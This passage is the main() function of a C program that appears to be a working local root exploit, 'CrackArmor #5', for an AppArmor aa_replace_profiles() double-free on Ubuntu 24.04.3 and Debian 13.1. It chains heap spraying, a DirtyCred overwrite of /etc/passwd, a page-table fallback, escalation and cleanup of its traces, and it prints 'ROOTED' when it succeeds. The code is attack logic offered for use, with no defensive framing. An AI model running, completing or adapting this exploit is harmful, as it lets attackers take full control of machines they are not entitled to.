/* -- main -------------------------------------------------------------- */

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    const char *env_yuuki = getenv("YUUKI_PATH");
    if (env_yuuki && env_yuuki[0])
        snprintf(g_yuuki_path, sizeof(g_yuuki_path), "%s", env_yuuki);

    const char *env_rooted = getenv("ROOTED_PATH");
    if (env_rooted && env_rooted[0])
        snprintf(g_rooted_path, sizeof(g_rooted_path), "%s", env_rooted);

    printf("[*] CrackArmor #5 -- AppArmor aa_replace_profiles() Double-Free\n");
    printf("[*] Qualys advisory 2026-03-10 | DirtyCred + PTE fallback\n");
    printf("[*] Target: Ubuntu 24.04.3 / Debian 13.1 (AppArmor enabled)\n\n");

    /* 1 */ pre_flight();
    /* 2 */ if (load_target_profile() != 0) return 1;
    /* 3 */ widen_race_window();
    /* 4 */ setup_fake_cred();
    /* 5 */ spray_passwd_fds();
    /* 6 */ trigger_double_free();
    /* 7 */ setup_heap_spray();

    /* 8. Try DirtyCred path (file-cred overwrite) */
    int dirtycred_ok = 0;
    if (attempt_file_cred_overwrite() == 0) {
        if (overwrite_passwd_via_fd() == 0)
            dirtycred_ok = 1;
    }

    /* 9. Fall back to PTE technique if DirtyCred failed */
    if (!dirtycred_ok) {
        pr_info("DirtyCred path failed -- trying PTE fallback (#4 technique)\n");
        if (pte_fallback() != 0) {
            pr_fail("all exploit paths failed\n");
            remove_profile(TARGET_PROFILE);
            cleanup_spray();
            return 1;
        }
    }

    /* 10 */ escalate();
    /* 11 */ restore_passwd();
    /* 12 */ remove_profile(TARGET_PROFILE);
    /* 13 */ cleanup_spray();

    struct stat st;
    int yuuki_suid = (stat(g_yuuki_path, &st) == 0 && (st.st_mode & S_ISUID));
    int rooted_ok  = (access(g_rooted_path, F_OK) == 0);

    if (yuuki_suid || rooted_ok) {
        printf("\n[+] *** ROOTED *** CrackArmor #5 double-free succeeded!\n");
        return 0;
    }
    printf("\n[-] root not achieved -- retry or calibrate (SIZEOF_STRUCT_FILE, FILE_F_CRED_OFF)\n");
    return 1;
}
